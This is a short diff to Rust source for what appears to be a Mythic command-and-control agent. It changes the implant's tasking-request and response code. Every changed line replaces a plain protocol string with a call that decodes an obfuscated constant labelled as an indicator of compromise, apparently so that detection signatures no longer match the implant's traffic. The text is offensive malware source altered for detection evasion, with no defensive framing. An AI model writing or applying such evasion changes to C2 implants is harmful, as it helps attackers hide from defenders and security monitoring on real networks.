@@ -134,8 +134,8 @@ impl Agent {
     /// Request new tasking from Mythic
     pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
         let json_body = json!({
-            "action": "get_tasking",
-            "tasking_size": -1,
+            &crate::obfstr::d(crate::obfstr::IOC_ACTION): crate::obfstr::d(crate::obfstr::IOC_GET_TASKING),
+            &crate::obfstr::d(crate::obfstr::IOC_TASKING_SIZE): -1,
         })
         .to_string();
 
@@ -188,7 +188,7 @@ impl Agent {
         let socks_to_send = get_socks_responses();
 
         let body = PostTaskingResponse {
-            action: "post_response".to_string(),
+            action: crate::obfstr::d(crate::obfstr::IOC_POST_RESPONSE),
             responses: completed.to_owned(),
             socks: if socks_to_send.is_empty() { None } else { Some(socks_to_send) },
         };
